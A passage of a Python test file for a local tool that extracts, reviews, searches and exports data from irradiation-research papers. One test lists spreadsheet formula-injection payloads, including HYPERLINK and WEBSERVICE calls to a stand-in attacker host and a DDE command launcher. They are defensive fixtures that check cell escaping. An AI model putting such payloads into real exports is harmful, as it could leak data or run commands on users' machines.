        other_row = add_manual_item(self.db, other, {
            "value_text": "777", "meaning": "范围测试温度", "unit": "°C",
            "article_title": "Scoped irradiation paper", "doi": "10.1/scoped-other",
            "context_explanation": "多文章检索范围验证",
        })
        other_finding = add_qualitative_item(self.db, other, {
            "finding_text": "范围测试未观察到空洞", "meaning": "范围测试结论",
            "context_explanation": "多文章检索范围验证", "source_page": 1,
            "source_locator": "Results", "source_excerpt": "no voids were observed",
        })
        scoped_rows = search_current_data(self.db, "", limit=1000, paper_ids={other})
        self.assertEqual({row["paper_id"] for row in scoped_rows}, {other})
        self.assertIn(other_row["item_id"], {row["item_id"] for row in scoped_rows})
        self.assertEqual(
            {row["item_id"] for row in search_export_rows(self.db, "", paper_ids={other})},
            {row["item_id"] for row in scoped_rows},
        )
        scoped_findings = search_qualitative_findings(self.db, "范围测试", paper_ids={other})
        self.assertEqual([row["item_id"] for row in scoped_findings], [other_finding["item_id"]])
        index_visual_evidence(self.db, self.paper_id)
        self.assertTrue(search_visual_assets(self.db, "", asset_type="table", paper_ids={self.paper_id}))
        self.assertFalse(search_visual_assets(self.db, "", asset_type="table", paper_ids={other}))

    def test_search_scope_parser_and_public_catalog_are_safe(self):
        self.assertIsNone(parse_search_paper_ids({}))
        self.assertEqual(parse_search_paper_ids({"paper_ids": ["2, 3", "3"]}), {2, 3})
        with self.assertRaisesRegex(ValueError, "positive integer"):
            parse_search_paper_ids({"paper_ids": ["2,nope"]})
        catalog = search_paper_catalog(self.db)
        self.assertTrue(catalog)
        self.assertNotIn("pdf_path", catalog[0])
        self.assertNotIn("local_article_key", catalog[0])

    def test_search_expands_element_names_to_symbols(self):
        other = self.db.upsert_paper(title="Tungsten alloy paper", doi="10.1/search-w")
        other_row = add_manual_item(self.db, other, {
            "value_text": "500", "meaning": "辐照温度", "unit": "°C",
            "article_title": "Tungsten alloy paper", "doi": "10.1/search-w",
            "context_explanation": "W-Ta-Cr-V refractory high entropy alloy；He离子辐照",
        })
        results = search_current_data(self.db, "钨", limit=1000)
        self.assertIn(other_row["item_id"], {row["item_id"] for row in results})

    def test_search_includes_first_and_corresponding_author(self):
        results = search_current_data(self.db, "Wei-Ying Chen", limit=1000)
        self.assertTrue(results)
        self.assertIn(self.paper_id, {row["paper_id"] for row in results})

    def test_search_filters_and_sort_are_shared_with_exports(self):
        manual = add_manual_item(self.db, self.paper_id, {
            "value_text": "42", "meaning": "搜索筛选人工量", "unit": "a.u.",
            "article_title": TARGET_TITLE, "doi": TARGET_DOI,
            "context_explanation": "人工补录；搜索筛选测试",
        })
        reviewed = search_current_data(self.db, "", limit=1000, review_filter="reviewed")
        pending = search_current_data(self.db, "", limit=1000, review_filter="pending")
        manual_only = search_current_data(self.db, "", limit=1000, source_filter="manual")
        self.assertIn(manual["item_id"], {row["item_id"] for row in reviewed})
        self.assertNotIn(manual["item_id"], {row["item_id"] for row in pending})
        self.assertEqual({row["item_id"] for row in manual_only}, {manual["item_id"]})
        exported = search_export_rows(self.db, "", review_filter="reviewed", source_filter="manual")
        self.assertEqual([row["item_id"] for row in exported], [manual["item_id"]])
        by_page = search_current_data(self.db, "", limit=1000, sort="source_page")
        target_rows = [row for row in by_page if row["paper_id"] == self.paper_id and row.get("source_page")]
        self.assertEqual(
            [row["source_page"] for row in target_rows],
            sorted(row["source_page"] for row in target_rows),
        )

    def test_search_rejects_unknown_filter_and_sort_values(self):
        with self.assertRaisesRegex(ValueError, "unsupported search review filter"):
            search_current_data(self.db, "", review_filter="trusted")
        with self.assertRaisesRegex(ValueError, "unsupported search source filter"):
            search_current_data(self.db, "", source_filter="spreadsheet")
        with self.assertRaisesRegex(ValueError, "unsupported search sort"):
            search_current_data(self.db, "", sort="random")

    def test_xlsx_export_package_contains_sheet_data(self):
        rows = search_current_data(self.db, "温度", limit=5)
        data = make_xlsx(rows, ["value_text", "meaning", "unit", "article_title", "doi"])
        self.assertTrue(data.startswith(b"PK"))
        self.assertIn(b"xl/worksheets/sheet1.xml", data)

    def test_csv_formula_payloads_are_neutralized(self):
        for value in (
            '=HYPERLINK("https://attacker.invalid/?leak=data")',
            "+cmd|' /C calc'!A0",
            "-2+3",
            "@SUM(1,1)",
            "\t=WEBSERVICE(\"https://attacker.invalid\")",
        ):
            safe = spreadsheet_safe_cell(value)
            self.assertEqual(safe, "'" + value)
        self.assertEqual(spreadsheet_safe_cell("ΔH_mix = -7.27"), "ΔH_mix = -7.27")
        self.assertEqual(spreadsheet_safe_cell("42"), "42")

    def test_service_binding_rejects_non_loopback_hosts(self):
        self.assertEqual(require_loopback_host("LOCALHOST"), "localhost")
        for host in ("0.0.0.0", "192.168.1.10", "example.invalid", ""):
            with self.assertRaisesRegex(ValueError, "local-only"):
                require_loopback_host(host)

    def test_qualitative_export_keeps_source_and_cluster_provenance(self):
        finding = search_qualitative_findings(self.db, "空洞", limit=1)[0]
        rows, fields = EvidenceHandler._qualitative_export_rows([finding])
        self.assertIn("finding_text", fields)
        self.assertIn("evidence_occurrences", fields)
        self.assertEqual(rows[0]["finding_text"], finding["finding_text"])
        self.assertIsInstance(json.loads(rows[0]["finding_member_ids"]), list)
        self.assertIsInstance(json.loads(rows[0]["evidence_occurrences"]), list)

    def test_stable_release_metadata_is_explicit(self):
        self.assertEqual(RELEASE_INFO["version"], "2026.07.30-librarian-brief-stable.1")
        self.assertEqual(RELEASE_INFO["evidence_schema"], 12)

    def test_rejected_cloud_visual_experiment_is_absent_from_active_ui(self):
        index_html = (WEB_DIR / "index.html").read_text(encoding="utf-8")
        app_js = (WEB_DIR / "app.js").read_text(encoding="utf-8")
        server_source = Path(webapp_module.__file__).read_text(encoding="utf-8")
        active_source = "\n".join((index_html, app_js, server_source))
        for marker in (
            "run-cloud-visual",
            "visual-processing-mode",
            "/api/current-paper/cloud-visual",
            "auto_verified_cloud_semantics",
        ):
            self.assertNotIn(marker, active_source)
        self.assertIn("/api/visual-search", active_source)

    def test_search_ui_has_scientific_typesetting_and_independent_paper_scope(self):
        index_html = (WEB_DIR / "index.html").read_text(encoding="utf-8")
        app_js = (WEB_DIR / "app.js").read_text(encoding="utf-8")
        app_css = (WEB_DIR / "app.css").read_text(encoding="utf-8")
        brief_js = (WEB_DIR / "librarian_brief.js").read_text(encoding="utf-8")
        self.assertIn('data-search-scope="selected"', index_html)
        self.assertIn("selectedSearchPaperParam", app_js)
        self.assertIn("scientificQuantityHtml", app_js)
        self.assertIn("visualTitleParts", app_js)
        self.assertIn('font-family:"Times New Roman"', app_css)
        self.assertNotIn('id="search-review-filter"', index_html)
        self.assertIn('id="context-chat"', index_html)
        self.assertIn(DEFAULT_CONTEXT_QUESTION, index_html)
        self.assertIn('id="item-detail-panel"', index_html)
        self.assertIn('id="visual-detail-panel"', index_html)
        self.assertIn("data-item-detail", app_js)
        self.assertNotIn("data-context-chat-item", app_js)
        self.assertIn("/api/context-chat", app_js)
        self.assertIn('id="librarian-progress"', index_html)
        self.assertIn('id="librarian-history-list"', index_html)
        self.assertIn('class="codex-pet-librarian"', index_html)
        self.assertIn('data-librarian-result-type="item"', index_html)
        self.assertIn('data-librarian-result-type="table"', index_html)
        self.assertIn('data-librarian-result-type="figure"', index_html)
        self.assertIn('data-librarian-result-type="finding"', index_html)
        self.assertIn("librarianMarkdown", app_js)
        self.assertIn("preferredLibrarianResultType", app_js)
        self.assertIn("agent_cited", app_js)
        self.assertIn('id="librarian-result-overview"', index_html)
        self.assertIn("codex-pet-working.webp", app_css)
        self.assertIn("librarianHistoryStorageKey", app_js)
        self.assertIn("paper_ids: []", app_js)
        self.assertIn('id="librarian-brief-export"', index_html)
        self.assertIn("getLatestLibrarianBriefSnapshot", app_js)
        self.assertIn("getLatestLibrarianBriefPayload", app_js)
        self.assertIn("librarianBriefAuth", app_js)
        self.assertNotIn("meta: state.librarianBriefAuth", app_js)
        self.assertIn("/api/agents/librarian/research-brief.md", brief_js)
        self.assertIn("snapshot_token", app_js)
        self.assertNotIn("localStorage", brief_js)
        self.assertNotIn("/api/desktop/librarian-history", brief_js)
        self.assertLess(
            index_html.index('<script src="/static/app.js"></script>'),
            index_html.index('<script src="/static/librarian_brief.js"></script>'),
        )
        server_source = Path(webapp_module.__file__).read_text(encoding="utf-8")
        self.assertIn("answer_context_chat", server_source)
        self.assertIn("export_research_brief", server_source)
        self.assertIn("verify_research_brief_snapshot", server_source)
        persistence_slice = app_js[
            app_js.index("async function persistLibrarianHistory"):
            app_js.index("async function loadLibrarianHistory")
        ]
        for transient_field in (
            "librarianBriefAuth",
            "snapshot_token",
            "answered_at",
            "evidence_version",
            "plan_mode",
        ):
            self.assertNotIn(transient_field, persistence_slice)
        reset_slice = app_js[
            app_js.index("function resetLibrarian"):
            app_js.index("function bindLibrarianSuggestions")
        ]
        restore_slice = app_js[
            app_js.index("function restoreLibrarianSession"):
            app_js.index("function deleteLibrarianSession")
        ]
        submit_slice = app_js[
            app_js.index("async function submitLibrarian"):
            app_js.index("function getLatestLibrarianBriefSnapshot")
        ]
        self.assertIn("clearLibrarianBriefAuthorization();", reset_slice)
        self.assertIn("clearLibrarianBriefAuthorization();", restore_slice)
        self.assertGreaterEqual(submit_slice.count("clearLibrarianBriefAuthorization();"), 2)
        self.assertLess(
            submit_slice.index("clearLibrarianBriefAuthorization();"),
            submit_slice.index("await api('/api/agents/librarian/chat'"),
        )
        self.assertIn("clearAuthorization: clearLibrarianBriefAuthorization", app_js)
        clear_auth_slice = app_js[
            app_js.index("function clearLibrarianBriefAuthorization"):
            app_js.index("globalThis.autoResearchLibrarianBrief")
        ]
        self.assertIn("currentToken !== expectedToken", clear_auth_slice)
        self.assertIn("state.librarianBriefAuth = null;", clear_auth_slice)
        export_slice = brief_js[
            brief_js.index("async function exportBrief"):
            brief_js.index('button.addEventListener("click", exportBrief)')
        ]
        self.assertIn("clearAuthorization?.();", export_slice)
        self.assertIn("if (!response.ok)", export_slice)
        export_failure_slice = export_slice[export_slice.index("} catch (error)"):]
        self.assertIn("clearAuthorization?.(payload.snapshot_token)", export_failure_slice)
        self.assertFalse(is_read_only_public_get("/api/context-chat"))
        self.assertIn('parsed.path in {"/", "/index.html", "/readonly"}', server_source)
        self.assertFalse((WEB_DIR / "readonly.html").exists())

    def test_librarian_stage_four_report_is_progressively_enhanced(self):
        index_html = (WEB_DIR / "index.html").read_text(encoding="utf-8")
        app_js = (WEB_DIR / "app.js").read_text(encoding="utf-8")
        app_css = (WEB_DIR / "app.css").read_text(encoding="utf-8")

        self.assertIn("function librarianReportHtml", app_js)
        self.assertIn("report.direct_conclusion", app_js)
        self.assertIn("report.evidence_matrix", app_js)
        self.assertIn("report.related_evidence", app_js)
        self.assertIn("report.database_gaps", app_js)
        self.assertIn("report.suggested_followups", app_js)
        self.assertIn("recommended_articles", app_js)
        self.assertIn("数据库内相关文章", app_js)
        self.assertIn("覆盖预警", app_js)
        self.assertIn("query_analysis", app_js)
        self.assertIn("agent_match_class", app_js)
        self.assertIn("agent_bundle_id", app_js)
        self.assertIn("data-librarian-reference", app_js)
        self.assertIn("data-agent-result-ref", app_js)
        self.assertIn("setInterval(updateLibrarianProgress, 1000)", app_js)
        submit_at = app_js.index("async function submitLibrarian")
        clear_at = app_js.index("state.librarianResults = [];", submit_at)
        request_at = app_js.index("await api('/api/agents/librarian/chat'", submit_at)
        self.assertLess(clear_at, request_at)

        tab_order = [
            index_html.index('data-librarian-result-type="item"'),
            index_html.index('data-librarian-result-type="finding"'),
            index_html.index('data-librarian-result-type="table"'),
            index_html.index('data-librarian-result-type="figure"'),
        ]
        self.assertEqual(tab_order, sorted(tab_order))
        self.assertIn('id="librarian-progress-time" aria-hidden="true"', index_html)
        self.assertIn("阶段是预计提示", index_html)
        self.assertIn(".librarian-research-report", app_css)
        self.assertIn(".librarian-query-chips", app_css)
        self.assertIn(".librarian-related-row", app_css)
        self.assertIn(".librarian-article-recommendations", app_css)
        self.assertIn(".librarian-article-warning", app_css)
        self.assertIn(".agent-result-ref.direct", app_css)

    def test_future_visual_metadata_prompt_requires_material_and_comparison_context(self):
        prompt = _visual_metadata_messages(
            {"title": "Example", "doi": "10.1/example"},
            [{"id": 1, "asset_type": "table", "label": "Table 1", "caption": "Nominal and measured composition", "source_context": "W alloy composition"}],
        )[0]["content"]
        self.assertIn("研究对象或材料", prompt)
        self.assertIn("比较双方", prompt)
        self.assertIn("缺少研究对象", prompt)

    def test_blank_search_and_paper_picker_counts_cover_all_papers(self):
        other = self.db.upsert_paper(title="Other irradiation paper", doi="10.1/search-all")
        other_row = add_manual_item(self.db, other, {
            "value_text": "888", "meaning": "跨库搜索测试温度", "unit": "°C",
            "article_title": "Other irradiation paper", "doi": "10.1/search-all",
            "context_explanation": "空搜索应该覆盖整个数据库，而不是只看当前文章",
        })
        all_rows = search_current_data(self.db, "", limit=1000)
        self.assertIn(other_row["item_id"], {row["item_id"] for row in all_rows})
        exported_rows = search_export_rows(self.db, "")
        self.assertIn(other_row["item_id"], {row["item_id"] for row in exported_rows})
        paper_counts = {row["id"]: row["six_row_count"] for row in list_paper_workflow_summaries(self.db)}
        self.assertEqual(paper_counts[self.paper_id], len(list_reportable_current_data(self.db, self.paper_id)))
        self.assertEqual(paper_counts[other], 1)

    def test_paper_picker_exposes_workflow_review_status(self):
        automatic_confirmed = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        confirm_correction(
            self.db,
            automatic_confirmed["item_id"],
            {field: automatic_confirmed[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")},
            "tester",
            "确认无修改",
        )
        other = self.db.upsert_paper(title="Unscanned paper", doi="10.1/not-scanned")
        papers = {row["id"]: row for row in list_paper_workflow_summaries(self.db)}
        self.assertEqual(papers[self.paper_id]["six_workflow_state"], "pending_review")
        self.assertEqual(papers[self.paper_id]["six_reviewed_count"], 1)
        reportable_total = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(papers[self.paper_id]["six_unreviewed_count"], reportable_total - 1)
        self.assertEqual(papers[self.paper_id]["six_workflow_label"], f"待审核 {reportable_total - 1}/{reportable_total}")
        self.assertEqual(papers[self.paper_id]["six_raw_row_count"], 114)
        self.assertEqual(papers[self.paper_id]["six_excluded_nonreportable_count"], 114 - reportable_total)
        self.assertEqual(papers[other]["six_workflow_state"], "not_scanned")
        self.assertEqual(papers[other]["six_workflow_label"], "未扫描")

    def test_current_paper_can_be_resolved_by_article_key(self):
        other = self.db.upsert_paper(title="Another paper", doi="10.1/other", local_article_key="ALT0001")
        set_current_paper(self.db, article_key="ALT0001")
        self.assertEqual(get_current_paper_id(self.db), other)
        self.assertEqual(resolve_paper_selector(self.db, article_key="ALT0001"), other)
        self.assertEqual(self.db.get_meta(CURRENT_PAPER_META_KEY), str(other))

    def test_paper_selector_accepts_doi_title_and_unique_title_fragment(self):
        self.assertEqual(resolve_paper_selector(self.db, article_key=TARGET_DOI), self.paper_id)
        self.assertEqual(resolve_paper_selector(self.db, article_key=TARGET_TITLE), self.paper_id)
        self.assertEqual(
            resolve_paper_selector(
                self.db,
                article_key="Irradiation effects in high entropy alloys and 316H stainless steel at 300 C",
            ),
            self.paper_id,
        )
        self.assertEqual(resolve_paper_selector(self.db, article_key="316H stainless steel at 300 C"), self.paper_id)

    def test_paper_selector_rejects_ambiguous_title_fragment(self):
        self.db.upsert_paper(title="Shared tungsten irradiation result A", doi="10.1/shared-a")
        self.db.upsert_paper(title="Shared tungsten irradiation result B", doi="10.1/shared-b")
        with self.assertRaisesRegex(ValueError, "匹配到多篇"):
            resolve_paper_selector(self.db, article_key="shared tungsten irradiation")

    def test_six_extraction_status_and_trigger_follow_current_paper(self):
        other = self.db.upsert_paper(title="Another paper", doi="10.1/other", local_article_key="ALT0001")
        unsupported = get_six_extraction_status(self.db, other)
        self.assertEqual(unsupported["action"], "manual_only")
        supported = get_six_extraction_status(self.db, self.paper_id)
        self.assertTrue(supported["supported"])
        result = extract_current_paper_data(self.db, self.paper_id)
        self.assertEqual(result["extraction"]["total"], 114)

    def test_unsupported_paper_can_prepare_prompt_packet(self):
        other = self.db.upsert_paper(
            title="Another paper", doi="10.1/other", local_article_key="ALT0001",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        old_prompt_dir = prompt_module.PROMPT_DIR
        prompt_module.PROMPT_DIR = Path(self.tmp.name) / "prompt_packets"
        try:
            with patch(
                "auto_research.evidence.six_column.DeepSeekSettings.from_env",
                return_value=DeepSeekSettings(api_key=None),
            ):
                status = get_six_extraction_status(self.db, other)
                self.assertEqual(status["action"], "prepare_packet")
                packet = prepare_current_paper_packet(self.db, other, max_pages=2)
                self.assertTrue(packet["packet_path"])
                packet_path = Path(packet["packet_path"])
                self.assertTrue(packet_path.is_file())
                packet_payload = json.loads(packet_path.read_text(encoding="utf-8"))
                self.assertEqual(packet_payload["experiment_profile"]["primary_type"], "irradiation_experiment")
                self.assertIn("extraction_foci", packet_payload)
                self.assertFalse(any(
                    instruction == "Extract only explicitly reported irradiation experiments and observations."
                    for instruction in packet_payload["instructions"]
                ))
                self.assertTrue(any(
                    "experiment_profile.paper_mode" in instruction
                    for instruction in packet_payload["instructions"]
                ))
                self.assertTrue(any(
                    "computational papers" in instruction
                    for instruction in packet_payload["instructions"]
                ))
                refreshed = get_six_extraction_status(self.db, other)
                self.assertTrue(refreshed["packet_ready"])
        finally:
            prompt_module.PROMPT_DIR = old_prompt_dir

    def test_source_view_returns_highlight_metadata(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "table3_al0_3cocrfeni_h0")
        source = get_source_view(self.db, row["item_id"])
        self.assertEqual(source["page_number"], 5)
        self.assertIn(source["match_type"], {"locator_and_value", "context_and_value", "value_only", "excerpt_window", "fuzzy_window"})
        self.assertTrue(source["image_url"].endswith("/source-highlight.png"))
        self.assertTrue(source["snippet_url"].endswith("/source-snippet.png"))

    def test_source_highlight_png_renders_page_image(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "dose_steps")
        image = render_source_highlight_png(self.db, row["item_id"])
        self.assertTrue(image.startswith(b"\x89PNG\r\n\x1a\n"))

    def test_source_snippet_png_renders_zoomed_image(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        image = render_source_snippet_png(self.db, row["item_id"])
        self.assertTrue(image.startswith(b"\x89PNG\r\n\x1a\n"))

    def test_learning_samples_include_corrections_and_manual_additions(self):
        automatic = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        revised_fields = {field: automatic[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")}
        revised_fields["context_explanation"] += "；人工补充说明"
        confirm_correction(self.db, automatic["item_id"], revised_fields, "tester", "补充上下文")
        add_manual_item(self.db, self.paper_id, {
            "value_text": "2.5",
            "meaning": "人工新增验证量",
            "unit": "a.u.",
            "article_title": TARGET_TITLE,
            "doi": TARGET_DOI,
            "context_explanation": "人工补录；用于后续学习样本验证",
        }, editor="tester")
        learning = collect_learning_samples(self.db, self.paper_id)
        self.assertEqual(learning["sample_count"], 2)
        self.assertEqual(learning["correction_count"], 1)
        self.assertEqual(learning["confirmation_count"], 0)
        self.assertEqual(learning["manual_count"], 1)
        correction = next(sample for sample in learning["samples"] if sample["sample_type"] == "correction")
        self.assertIn("context_explanation", correction["changed_fields"])
        self.assertEqual(correction["original"]["value_text"], "300")
        manual = next(sample for sample in learning["samples"] if sample["sample_type"] == "manual_addition")
        self.assertIsNone(manual["original"])
        self.assertEqual(manual["corrected"]["meaning"], "人工新增验证量")

    def test_learning_report_previews_prompt_guidance_without_claiming_evidence(self):
        automatic = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        revised_fields = {field: automatic[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")}
        revised_fields["context_explanation"] += "；人工补充字段边界"
        confirm_correction(self.db, automatic["item_id"], revised_fields, "tester", "补充上下文")
        report = build_learning_report(self.db, self.paper_id)
        self.assertEqual(report["sample_count"], 1)
        self.assertEqual(report["correction_count"], 1)
        self.assertTrue(report["included_in_prompt"])
        self.assertIn("HUMAN REVIEW LEARNING HINTS", report["guidance_preview"])
        self.assertIn("Never copy values", report["guidance_preview"])
        self.assertIn("字段边界", report["message"])
        self.assertEqual(report["included_samples"][0]["changed_labels"], ["数据在文中的解释"])

    def test_global_learning_samples_span_multiple_papers(self):
        other = self.db.upsert_paper(title="Other paper", doi="10.1/learning-other")
        add_manual_item(self.db, other, {
            "value_text": "9",
            "meaning": "跨文章人工学习样本",
            "unit": "a.u.",
            "article_title": "Other paper",
            "doi": "10.1/learning-other",
            "context_explanation": "另一篇文章；人工补录；用于全库学习样本导出",
        }, editor="tester")
        current_learning = collect_learning_samples(self.db, self.paper_id)
        all_learning = collect_learning_samples(self.db)
        self.assertEqual(current_learning["sample_count"], 0)
        self.assertEqual(all_learning["sample_count"], 1)
        self.assertEqual(all_learning["samples"][0]["paper_id"], other)

    def test_evidence_audit_checks_pdf_highlight_coverage(self):
        audit = audit_six_column_evidence(self.db, self.paper_id)
        reportable_count = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(audit["automatic_rows"], reportable_count)
        self.assertEqual(audit["checked_rows"], reportable_count)
        self.assertGreater(audit["highlighted_rows"], 80)
        self.assertGreater(audit["strong_rows"], 40)
        self.assertEqual(len(audit["review_priority_rows"]), reportable_count)
        self.assertGreater(audit["review_priority_counts"]["unreviewed_attention"], 0)
        self.assertEqual(
            sum(audit["review_priority_counts"][level] for level in ("high", "medium", "normal")),
            reportable_count,
        )
        self.assertGreaterEqual(
            audit["review_priority_rows"][0]["score"],
            audit["review_priority_rows"][-1]["score"],
        )
        self.assertIn("PDF", audit["message"])

    def test_run_article_workflow_extracts_target_by_article_key(self):
        result = run_article_workflow(self.db, article_key="TESTKEY")
        self.assertEqual(result["action"], "extract")
        self.assertEqual(result["paper"]["id"], self.paper_id)
        reportable_count = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(result["status_after"]["row_count"], reportable_count)
        self.assertEqual(result["evidence_audit"]["checked_rows"], reportable_count)
        self.assertEqual(result["learning"]["sample_count"], 0)
        self.assertEqual(result["experiment_profile"]["primary_type"], "irradiation_experiment")

    def test_experiment_type_classifier_handles_target_and_non_irradiation_experiments(self):
        target_profile = classify_experiment_types(
            self.db.get_paper(self.paper_id),
            pdf_path=Path(self.db.get_paper(self.paper_id)["pdf_path"]),
        )
        self.assertEqual(target_profile["primary_type"], "irradiation_experiment")
        self.assertIn("mechanical_testing", {item["type_id"] for item in target_profile["types"]})

        thermal_pdf = Path(self.tmp.name) / "thermal.pdf"
        doc = fitz.open()
        page = doc.new_page()
        page.insert_text(
            (54, 72),
            "Experimental methods. Thermal conductivity was measured by laser flash analysis. "
            "Differential scanning calorimetry (DSC) was performed from 300 K to 900 K.",
            fontsize=10,
        )
        thermal_pdf.write_bytes(doc.tobytes())
        doc.close()
        thermal_profile = classify_experiment_types(
            {"title": "Thermal conductivity and DSC measurements of alloy samples"},
            pdf_path=thermal_pdf,
        )
        self.assertEqual(thermal_profile["primary_type"], "thermal_measurement")
        self.assertTrue(thermal_profile["is_experimental"])

    def test_web_experiment_profile_summarizes_current_paper_type(self):
        profile = current_experiment_profile(self.db, self.paper_id)
        self.assertEqual(profile["paper_id"], self.paper_id)
        self.assertEqual(profile["primary_type"], "irradiation_experiment")
        self.assertTrue(profile["is_experimental"])
        self.assertIn("types", profile)

    def test_self_check_verifies_target_article_workflow_readiness(self):
        report = check_evidence_workflow(
            self.db,
            "Irradiation effects in high entropy alloys and 316H stainless steel at 300 C",
            queries=["温度", "硬度", "Wei-Ying Chen"],
            min_rows=100,
            min_highlight_ratio=0.8,
        )
        self.assertTrue(report["ok"], report["checks"])
        self.assertEqual(report["paper"]["id"], self.paper_id)
        self.assertEqual(report["summary"]["primary_experiment_type"], "irradiation_experiment")
        reportable_count = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(report["summary"]["row_count"], reportable_count)
        self.assertEqual(report["summary"]["review_progress"]["total"], reportable_count)
        self.assertGreaterEqual(report["summary"]["review_progress"]["unreviewed"], 100)
        self.assertGreaterEqual(report["summary"]["highlighted_rows"], 100)
        self.assertTrue(all(check["ok"] for check in report["checks"]))
        by_name = {check["name"]: check for check in report["checks"]}
        self.assertTrue(by_name["experiment_type_detection"]["ok"])
        self.assertTrue(by_name["web_ui_contract"]["ok"])
        self.assertIn("manual_entry", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("learning_guidance_preview", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("confirm_and_next", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("automatic_quality_gate", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("multi_paper_search_scope", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_keyboard_shortcuts", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_progress_card", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_negative_decisions", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_reopen_all_states", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("optional_reviewer_note", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_feedback_refresh", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_source_sort", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_priority_queue", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("compact_article_tools", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("view_specific_header", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("focus_review_mode", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("initial_row_selection", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("row_source_button", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("source_highlight", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("next_unreviewed_queue", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_batch_download", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_calibration_download", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("resumable_calibration_review", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("review_all_download", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("item_id_review_filter", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("experiment_profile_card", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("paper_status_overview", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("readonly_mode", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("readonly_search_only_mode", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("search_source_evidence_button", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("readonly_source_direct", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("search_review_state", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertIn("dense_review_rows", by_name["web_ui_contract"]["web_ui"]["checked"])
        self.assertNotIn("public_readonly_ngrok_share", by_name)
        requirements = {item["id"]: item for item in report["requirements"]}
        self.assertTrue(all(item["ok"] for item in requirements.values()))
        self.assertTrue(requirements["article_selector_to_extracted_rows"]["ok"])
        self.assertTrue(requirements["six_required_columns"]["ok"])
        self.assertTrue(requirements["editable_review_preserves_original"]["ok"])
        self.assertTrue(requirements["manual_entry_without_original"]["ok"])
        self.assertTrue(requirements["free_text_fuzzy_search_and_export"]["ok"])
        self.assertTrue(requirements["automatic_quality_gate"]["ok"])

    def test_db_health_checks_current_view_indexes_and_required_fields(self):
        report = evidence_db_health(self.db, paper_id=self.paper_id)
        self.assertTrue(report["ok"], report["checks"])
        self.assertEqual(report["row_count"], 114)
        self.assertEqual(report["review_progress"]["total"], len(list_reportable_current_data(self.db, self.paper_id)))
        checks = {check["name"]: check for check in report["checks"]}
        self.assertTrue(checks["schema_version"]["ok"])
        self.assertTrue(checks["current_view"]["ok"])
        self.assertTrue(checks["required_indexes"]["ok"])
        self.assertTrue(checks["six_required_fields"]["ok"])
        self.assertTrue(checks["sqlite_integrity"]["ok"])
        self.assertTrue(checks["stale_ai_runs"]["ok"])
        self.assertTrue(checks["completed_run_artifacts"]["ok"])

    def test_db_health_reports_stale_ai_runs_and_missing_artifacts(self):
        with self.db.connect() as conn:
            common = (
                self.paper_id,
                "deepseek",
                "deepseek-chat",
                "preview",
                "0" * 64,
            )
            conn.execute(
                """INSERT INTO ai_extraction_runs(
                     paper_id,provider,model,mode,status,pdf_sha256,output_path,created_at
                   ) VALUES(?,?,?,?,?,?,?,?)""",
                (*common[:4], "running", common[4], None, "2020-01-01T00:00:00+00:00"),
            )
            conn.execute(
                """INSERT INTO ai_extraction_runs(
                     paper_id,provider,model,mode,status,pdf_sha256,output_path,created_at,finished_at
                   ) VALUES(?,?,?,?,?,?,?,?,?)""",
                (
                    *common[:4],
                    "completed",
                    common[4],
                    str(Path(self.tmp.name) / "missing-run.json"),
                    "2026-01-01T00:00:00+00:00",
                    "2026-01-01T00:01:00+00:00",
                ),
            )

        checks = {check["name"]: check for check in evidence_db_health(self.db)["checks"]}
        self.assertFalse(checks["stale_ai_runs"]["ok"])
        self.assertTrue(checks["stale_ai_runs"]["examples"])
        self.assertFalse(checks["completed_run_artifacts"]["ok"])
        self.assertTrue(checks["completed_run_artifacts"]["examples"])

    def test_reconcile_stale_runs_only_updates_audit_metadata(self):
        before_rows = len(list_current_data(self.db, self.paper_id))
        with self.db.connect() as conn:
